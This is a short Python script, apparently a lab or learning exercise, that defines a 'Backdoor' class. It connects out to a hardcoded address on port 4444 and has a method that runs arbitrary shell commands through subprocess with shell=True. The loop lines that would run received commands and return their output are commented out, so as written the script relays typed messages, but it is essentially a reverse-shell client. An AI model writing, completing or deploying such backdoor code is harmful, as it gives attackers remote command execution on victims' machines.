import socket
import subprocess


class Backdoor:
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def executecommand(self,command):
        return subprocess.check_output(command, shell=True)


    def run(self):
        data = ""
        while True:
            try:
                data = data + self.connection.recv(1024).decode()
                print(data)
                if "OVER" in data:
                    message = str(input("Enter your message"))
                    while "OVER" not in message:
                        continuedmessage=str(input("Enter your message"))
                        message = message+continuedmessage
                    self.connection.send(message.encode())
                    data=""
                elif "STOP" in data:
                    self.connection.close()
                    break
                # ans = self.executecommand(data)
                # self.connection.send(ans)
                data = ""
            except:
                if "STOP" in data:
                    self.connection.close()
                    break
                ans = "There has been an error"
                self.connection.send(ans.encode())
                data = ""
        print("The connection is getting ended from this side")
        self.connection.close()

ip = "192.168.157.128"
port = 4444
backdoor=Backdoor(ip,port)
backdoor.run()